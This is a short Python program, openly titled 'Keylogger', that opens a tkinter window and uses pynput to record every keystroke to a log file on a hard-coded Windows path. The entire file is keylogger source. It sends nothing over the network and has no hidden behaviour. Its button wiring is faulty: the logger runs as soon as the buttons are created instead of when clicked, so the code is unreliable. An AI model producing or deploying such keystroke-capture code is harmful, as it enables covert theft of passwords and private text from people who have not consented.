from tkinter import *
import logging
from pynput import keyboard
# user interface
class MyException(Exception):
    pass
def startlogger(a):
    LOG_FOR = '%(message)s'
    logging.basicConfig(filename="C:\\Users\\A-One\\PycharmProject\\Projectt\\Actual_logger.Log", level=logging.DEBUG,
                        format=LOG_FOR, filemode="w")
    # creating object of class getLogger()
    logger = logging.getLogger()

    def on_press(key):
        if key == keyboard.Key.esc or a==0:
            raise MyException(key)
        logger.info(key)

    with keyboard.Listener(
            on_press=on_press) as listenme:
        try:
            listenme.join()
        except MyException as e:
            print('{0} was pressed'.format(e.args[0]))
if __name__=="__main__":
    a=Tk()
    a.title("Keylogger")
    a.geometry("500x500")
    bb1=Button(a, text = "Start", command = startlogger(1)).grid(row = 0,column = 0)
    bb2=Button(a, text = "Stop", command = startlogger(0)).grid(row = 0, column = 1)
    a.mainloop()
